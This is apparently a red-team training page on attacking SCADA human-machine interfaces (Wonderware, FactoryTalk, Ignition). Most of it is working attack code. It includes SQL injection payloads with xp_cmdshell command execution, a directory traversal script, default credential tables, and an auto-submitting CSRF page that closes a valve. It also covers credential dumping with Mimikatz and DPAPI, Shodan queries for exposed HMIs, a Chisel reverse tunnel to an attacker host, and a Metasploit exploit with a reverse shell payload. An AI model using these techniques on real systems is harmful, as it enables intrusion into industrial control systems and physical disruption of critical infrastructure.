---
layout: training-page
title: "SCADA HMI Attacks — Red Team Academy"
module: "OT/ICS Security"
tags:
  - scada
  - hmi
  - wonderware
  - ignition
  - factorytalk
page_key: "ot-ics-scada-hmi-attacks"
render_with_liquid: false
---

# SCADA HMI Attacks

Human-Machine Interfaces are the operator-facing component of SCADA systems. They provide visualization, alarming, and control capabilities. HMIs are a high-value target because:

1. They often have credentials to all downstream PLCs and devices
2. They run full Windows operating systems with much larger attack surfaces
3. They bridge IT and OT networks
4. Operators interact with them constantly, creating social engineering opportunities

---

## HMI Attack Surface Overview

```
HMI Attack Surfaces:
┌─────────────────────────────────────────────────────┐
│ Web-Based HMIs                                       │
│  ├── Default credentials (admin:admin, user:user)    │
│  ├── CSRF on control actions                         │
│  ├── SQL injection in historian queries              │
│  ├── XSS in tag display                              │
│  └── Unauthenticated REST APIs                       │
├─────────────────────────────────────────────────────┤
│ Thick Client HMIs (Windows Application)              │
│  ├── Windows OS vulnerabilities (XP/7)               │
│  ├── Stored credentials for PLC connections          │
│  ├── Weak/default service account passwords          │
│  └── DLL hijacking in vendor software                │
├─────────────────────────────────────────────────────┤
│ Remote Access to HMI Workstations                    │
│  ├── VNC with no auth or weak password               │
│  ├── RDP with default/weak credentials               │
│  ├── PCAnywhere (still found!)                       │
│  └── TeamViewer with embedded credentials            │
└─────────────────────────────────────────────────────┘
```

---

## Wonderware (AVEVA InTouch)

### Overview

Wonderware InTouch is one of the oldest and most widely deployed HMI platforms, particularly in legacy manufacturing, oil and gas, and water utilities.

### Default Credentials

```bash
# Wonderware InTouch Web Client
# Default URL: http://<server>/Wonderware/
# Default credentials:
# admin / (blank)
# administrator / (blank)
# guest / guest

# Wonderware Application Server (ArchestrA)
# Galaxy Database default SA:
mssqlclient.py sa:''@<wonderware_server>

# Wonderware uses Microsoft SQL Server for historian storage
# Check for SQL Server on default ports
nmap -p 1433,1434 <wonderware_server>
```

### SQL Injection in Historian Queries

Wonderware stores process data in Microsoft SQL Server. Queries from the web interface often concatenate user-supplied tag names directly into SQL.

```python
# Wonderware Web Thin Client — tag name SQL injection
# Tag display URL:
# http://<server>/InTouchWebClient/TagDetails.aspx?tag=MOTOR_SPEED

# Basic SQL injection test:
import requests

base_url = "http://192.168.1.100/InTouchWebClient/TagDetails.aspx"

# Test for SQL injection in tag parameter
payloads = [
    "MOTOR_SPEED'",                                    # Basic break
    "MOTOR_SPEED' OR '1'='1",                          # Always true
    "' UNION SELECT 1,@@version,3,4-- -",              # Version extraction
    "'; EXEC xp_cmdshell('whoami')-- -",               # RCE via xp_cmdshell
]

for payload in payloads:
    r = requests.get(base_url, params={'tag': payload})
    print(f"Payload: {payload[:30]}")
    print(f"Status: {r.status_code}")
    if 'error' in r.text.lower() or 'sql' in r.text.lower():
        print("  [!] Possible SQL error reflection")
    print()
```

### Wonderware Historian Direct SQL Access

```bash
# Wonderware historian database is typically named "Runtime" or "wwHist"
# Access via SQL Server
mssqlclient.py 'DOMAIN\historian_svc'@192.168.1.100 -windows-auth

# Enumerate historian databases
SQL> SELECT name FROM master.dbo.sysdatabases;

# Query process data (actual plant operational data)
SQL> USE Runtime;
SQL> SELECT TOP 100 TagName, DateTime, Value FROM History 
     ORDER BY DateTime DESC;

# Extract all configured tag names (plant intelligence)
SQL> SELECT TagName, Description, EngUnits FROM Tag;

# This reveals:
# - All monitored process variables
# - Engineering units (tells you what each sensor measures)
# - Description (e.g., "Reactor 3 Temperature", "Pump 2 Flow Rate")
```

### Credential Dumping from InTouch

```bash
# InTouch stores node credentials in:
# C:\Program Files\Wonderware\InTouch\NodeDetails.xml
# C:\ProgramData\ArchestrA\GalaxyConfiguration\

# After gaining access to HMI workstation:
type "C:\Program Files\Wonderware\InTouch\*.xml" | findstr /i "password\|credential\|host"

# InTouch uses WindowsMaker for development — project files contain node connections
# Project directory: C:\Wonderware\InTouch\<ProjectName>\
dir "C:\Wonderware\InTouch\" /s /b | findstr ".ini\|.dat"

# WindowsMaker project file (*.wsp) contains IO server connection details
strings "C:\Wonderware\InTouch\Project\InTouch.wsp" | grep -i "password\|server\|ip"
```

---

## FactoryTalk (Rockwell Automation)

### Overview

Rockwell's FactoryTalk suite is dominant in North American discrete manufacturing. Components include:

- **FactoryTalk View**: HMI software (ME for machine, SE for SCADA)
- **FactoryTalk Historian**: Process data archiving
- **FactoryTalk AssetCentre**: Asset management
- **FactoryTalk Linx**: Communication gateway to PLCs

### CVE Catalog

| CVE | Component | Description | CVSS |
|-----|-----------|-------------|------|
| CVE-2022-1162 | FactoryTalk View SE | Hardcoded credentials allow remote code execution | 9.8 |
| CVE-2021-27478 | FactoryTalk AssetCentre | SQL injection via tag query parameters | 9.1 |
| CVE-2020-6998 | FactoryTalk View ME | Buffer overflow in project file parsing | 7.8 |
| CVE-2019-10952 | FactoryTalk View SE | Directory traversal in web server component | 7.5 |
| CVE-2018-14821 | FactoryTalk SE | Unauthenticated remote code execution | 9.8 |

### Directory Traversal (CVE-2019-10952)

```python
#!/usr/bin/env python3
# FactoryTalk View SE — Directory Traversal
import requests

target = "http://192.168.1.100:7766"  # FactoryTalk View SE web port

# Test directory traversal
traversal_payloads = [
    "/../../../../windows/win.ini",
    "/../../../windows/system32/drivers/etc/hosts",
    "/..%2F..%2F..%2Fwindows%2Fwin.ini",
    "/%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
]

for path in traversal_payloads:
    url = f"{target}{path}"
    try:
        r = requests.get(url, timeout=5, verify=False)
        if r.status_code == 200 and ('for 16-bit' in r.text or 'HOSTS' in r.text):
            print(f"[+] VULNERABLE! Path: {path}")
            print(f"    Content preview: {r.text[:100]}")
            break
    except:
        pass
```

### FactoryTalk Credential Extraction

```bash
# FactoryTalk stores credentials in:
# HKLM\SOFTWARE\Rockwell Software\RSLinx\...
# HKLM\SOFTWARE\Rockwell Software\FactoryTalk\...

# After obtaining shell on HMI workstation:
reg query "HKLM\SOFTWARE\Rockwell Software\RSLinx" /s | findstr /i "password\|passwd"

# RSLinx stores PLC connections in:
# C:\Users\Public\Documents\RSLinx Enterprise\*.rsp

# FactoryTalk configuration files
dir "C:\ProgramData\Rockwell Software\" /s /b | findstr ".xml\|.config\|.ini"

# Extract from FactoryTalk Security database (SQL Server)
# Database name: FTLD (FactoryTalk Local Directory)
mssqlclient.py sa:'rockwell'@localhost
SQL> USE FTLD;
SQL> SELECT UserName, Password FROM Users;
```

---

## Ignition (Inductive Automation)

### Overview

Ignition is a modern, web-based SCADA platform rapidly gaining market share. It uses:
- Java-based server (Ignition Gateway)
- Web-based clients (no thick client installation)
- SQL databases for historians
- OPC-UA for device communication
- Default port 8088 (HTTP), 8043 (HTTPS), 8060 (HTTPS gateway)

### Default Credentials

```bash
# Ignition Gateway always has default admin credentials
# http://<server>:8088/web/home
# Default: admin / password

# After first login, user is prompted to change — but often doesn't
curl -s -c cookies.txt -b cookies.txt \
  -d "j_username=admin&j_password=password&action=Login" \
  "http://192.168.1.100:8088/post-auth/j_security_check"

# Check for successful login
curl -s -b cookies.txt "http://192.168.1.100:8088/web/status" | grep -i "gateway"
```

### Perspective Module SSRF

```python
#!/usr/bin/env python3
# Ignition Perspective — Server-Side Request Forgery
# Perspective's scripting functions can make arbitrary HTTP requests

import requests

# The Perspective Scripting API can be abused if authenticated
# to make the Ignition server perform SSRF attacks

target = "http://192.168.1.100:8088"
session = requests.Session()

# Authenticate
login_data = {
    'j_username': 'admin',
    'j_password': 'password',
    'action': 'Login'
}
session.post(f"{target}/post-auth/j_security_check", data=login_data)

# Use system.net.httpGet from Perspective scripting to reach internal hosts
# This can reach OT network hosts that the Ignition server has access to
ssrf_script = """
import system
# Make request to internal OT device (from Ignition server's network perspective)
response = system.net.httpGet("http://10.0.1.100/")  # OT network target
return response
"""
# Execute via Perspective's script endpoint (requires authentication)
# This demonstrates how Ignition bridges IT and OT network access
```

### Tag Browser Abuse — Intelligence Gathering

```python
#!/usr/bin/env python3
# Ignition Tag Browser API — extract all configured tags
# Reveals complete picture of monitored process variables

import requests
import json

target = "http://192.168.1.100:8088"
session = requests.Session()

# Authenticate
session.post(f"{target}/post-auth/j_security_check", 
             data={'j_username': 'admin', 'j_password': 'password'})

# Browse all tags via REST API (authenticated)
# This reveals all connected PLCs and their tag structure
response = session.get(f"{target}/system/webdev/TagBrowser/browse",
                       params={'path': '[default]', 'recursive': 'true'})

tags = response.json()
print(f"[+] Found {len(tags)} top-level tag providers")

for provider in tags:
    print(f"\n[*] Provider: {provider['name']}")
    # Each provider may be a different PLC or device
    # Tags reveal: device addresses, parameter names, engineering units
    for tag in provider.get('children', [])[:20]:
        print(f"  Tag: {tag['name']} | Path: {tag['path']}")

# Read current values of all tags
# This gives real-time process data without touching PLCs directly
```

### Ignition OPC-UA Server

```bash
# Ignition exposes an OPC-UA server that clients can browse
# Port 4096 (default OPC-UA in Ignition)
nmap -p 4096 --script=opcua-info <target>

# Python OPC-UA client
pip install opcua

python3 -c "
from opcua import Client
c = Client('opc.tcp://192.168.1.100:4096')
c.connect()
root = c.get_root_node()
# Browse all nodes (reveals all tags/devices)
for child in root.get_children():
    print(child.get_browse_name(), child.get_node_id())
c.disconnect()
"
```

---

## Web HMI Attacks: Default Admin Panels

### Common Web HMI Targets Found via Shodan

```bash
# Shodan searches for exposed HMIs
shodan search "http.title:\"SCADA\" port:80,443"
shodan search "product:\"Ignition\" port:8088"
shodan search "product:\"InTouch\" port:80"
shodan search "http.title:\"FactoryTalk\" port:80"
shodan search "Wonderware http.title:login"

# BACnet Building Automation (often internet-exposed)
shodan search "port:47808"

# Mitsubishi SCADA
shodan search "MELSEC port:5006,5007"

# Codesys WebVisu (Bosch Rexroth, many brands)
shodan search "port:8080 WebVisu"
```

### Generic Web HMI Default Credentials

```
# Compile of commonly found default credentials:
Vendor         | Product          | Username    | Password
---------------|-----------------|-------------|----------
Inductive Auto | Ignition         | admin       | password
Wonderware     | InTouch          | Administrator | (blank)
Rockwell       | FactoryTalk SE   | administrator | 1234
Schneider      | EcoStruxure      | USER        | USER
GE             | iFIX             | admin       | admin
Siemens        | WinCC            | Administrator | (blank)
Iconics        | GENESIS64        | admin       | admin
Kepware        | KEPServerEX      | Administrator | (blank)
Tridium        | Niagara 4        | admin       | admin
Honeywell      | Experion         | mngr        | mngr
```

### CSRF on Control Actions

```html
<!-- CSRF attack against web HMI that lacks CSRF token -->
<!-- If an operator visits this page while authenticated to HMI, 
     it will submit the control action on their behalf -->
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="http://scada.internal:8080/api/control/valve" method="POST">
    <input type="hidden" name="tag" value="VALVE_1_CMD" />
    <input type="hidden" name="value" value="0" />
    <!-- No CSRF token = vulnerable -->
  </form>
  <p>Loading...</p>
</body>
</html>
```

---

## Credential Dumping from HMI Software

### Stored PLC Credentials

```bash
# After gaining shell on HMI workstation, extract stored credentials

# Windows Credential Manager (common storage for OPC/HMI connections)
cmdkey /list
# Output shows stored credentials for OPC servers, historians, PLCs

# PowerShell to extract from Credential Manager
[void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, 
ContentType = WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }

# Mimikatz on HMI workstation
# (HMI workstations often have local admin accounts connecting to PLCs)
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# DPAPI credential extraction (many SCADA products use DPAPI for storage)
dpapi::cred /in:"C:\Users\operator\AppData\Roaming\Microsoft\Credentials\*"

# Grep for cleartext passwords in SCADA config files
Get-ChildItem -Path C:\ -Recurse -Include *.ini,*.xml,*.config,*.cfg -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|passwd|credential" |
  Select Path, Line
```

### Specific SCADA Credential Locations

```bash
# KEPServerEX (very common OPC-DA/UA gateway)
# Credentials stored in:
type "C:\ProgramData\Kepware\KEPServerEX\V6\*.opf"  # Project files
# OptoScript tag source credentials
reg query "HKLM\SOFTWARE\Kepware\KEPServerEX 6" /s | findstr /i "password"

# OSIsoft PI System credentials (for PI Data Archive connections)
type "C:\Program Files\PIPC\*.ini" | findstr -i "password\|user"

# Citect SCADA (Schneider)
type "C:\Program Files\Schneider Electric\Citect SCADA*\*.cfg" | findstr -i "password"

# Matrikon OPC Server credentials
reg query "HKLM\SOFTWARE\Matrikon" /s | findstr /i "password"
```

---

## Historian SQL Injection

### PI SQL Commander

```bash
# OSIsoft PI SQL Commander uses SQL-like syntax to query PI data
# Connection string may be stored in ODBC configuration

# PI OLEDB Provider connection:
# Provider=PIOleDb.1;Data Source=<pi_server>;Integrated Security=SSPI

# Test SQL injection in PI-SDK-based applications
# PI tag names are passed as strings — check for injection

# Direct PI SQL via JDBC
# pi.jdbc.driver.PIDriver
# URL: jdbc:pioledb://<pi_server>/

# AspenTech SQLPlus — similar attack surface
# Connection: OLEDB connection to IP.21 database
# Queries: SELECT * FROM IP_AnalogDef WHERE IP_TAG_NAME LIKE '%REACTOR%'
```

### Injecting via Historian Web API

```python
#!/usr/bin/env python3
# Test for SQL injection in PI Web API tag search
import requests

pi_server = "https://192.168.1.100/piwebapi"
session = requests.Session()
session.verify = False

# PI Web API tag search — check for injection
# Normal: /piwebapi/search?q=MOTOR_SPEED
# Injected: add SQL metacharacters

test_payloads = [
    "MOTOR_SPEED'",
    "MOTOR_SPEED%27",  
    "'; SELECT @@version--",
    "' OR '1'='1",
]

for payload in test_payloads:
    r = session.get(f"{pi_server}/search", params={'q': payload, 'count': 5})
    print(f"Payload: {payload[:30]} | Status: {r.status_code}")
    if 'exception' in r.text.lower() or 'error' in r.text.lower():
        print(f"  [!] Error in response: {r.text[:200]}")
```

---

## Pivoting from Compromised HMI to OT Network

```bash
# HMI typically has:
# - Network interface to engineering/operations network
# - Active connections to PLCs (Modbus TCP, S7comm, EtherNet/IP)
# - Firewall exceptions for these PLC connections

# After compromising HMI, map OT network reachability
# (Use tools already on system — avoid triggering AV)

# Using Windows built-in tools:
arp -a                           # See PLCs that have recently communicated
netstat -ano                     # Active connections to PLCs
route print                      # Understand routable networks

# Using PowerShell for port scan (low-noise)
1..254 | ForEach-Object { 
    $ip = "10.0.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        Write-Host "$ip is alive"
    }
}

# Port scan PLCs from HMI (has firewall bypass)
foreach ($port in @(102, 502, 20000, 44818)) {
    foreach ($ip in @("10.0.1.1", "10.0.1.2", "10.0.1.3")) {
        $tcp = New-Object System.Net.Sockets.TcpClient
        try {
            $tcp.Connect($ip, $port)
            Write-Host "[+] $ip :$port OPEN"
        } catch {}
        $tcp.Close()
    }
}

# Set up Chisel SOCKS proxy through HMI (Windows)
# On attacker:
./chisel server -p 8888 --reverse

# On compromised HMI:
chisel.exe client <attacker_ip>:8888 R:socks

# Now route ICS tools through HMI's network context
proxychains python3 modbus_enum.py 10.0.1.1
```

---

## Metasploit SCADA Modules

```bash
# Available Metasploit SCADA/HMI modules
msf6 > search type:auxiliary name:scada
msf6 > search type:exploit name:scada
msf6 > search type:auxiliary name:wonderware
msf6 > search type:auxiliary name:ignition

# Specific modules:
use auxiliary/scanner/scada/modbusdetect
use auxiliary/admin/scada/modbusclient
use auxiliary/scanner/scada/econotag_radio_war_drive
use exploit/windows/scada/igss_dataserver
use exploit/windows/scada/igss_readconfig  # Schneider IGSS
use exploit/windows/scada/citect_scada_odbc  # Citect SCADA
use exploit/windows/scada/realwin_scpc_initialize  # DATAC RealWin
use exploit/windows/scada/wincc_sql_injection  # Siemens WinCC

# Siemens WinCC SQL Injection (CVE-2011-4516)
msf6 > use exploit/windows/scada/wincc_sql_injection
msf6 exploit(wincc_sql_injection) > set RHOST 192.168.1.100
msf6 exploit(wincc_sql_injection) > set RPORT 1433
msf6 exploit(wincc_sql_injection) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(wincc_sql_injection) > set LHOST 192.168.1.200
msf6 exploit(wincc_sql_injection) > run
```

---

*Next: [Historian Server Attacks](historian-attacks.md)*
